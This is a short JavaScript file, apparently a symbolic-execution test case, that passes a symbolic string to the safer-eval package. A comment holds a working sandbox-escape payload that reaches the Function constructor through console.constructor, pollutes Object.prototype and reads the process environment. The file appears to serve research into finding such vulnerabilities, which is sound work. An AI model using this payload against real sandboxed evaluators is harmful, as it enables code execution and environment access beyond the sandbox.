const saferEval = require("safer-eval");
const esl_symbolic = require("esl_symbolic");
var payload= esl_symbolic.string("payload");
saferEval(payload);
//"console.constructor.constructor('return 1+(Object.prototype.polluted=`yes`)')().env"

 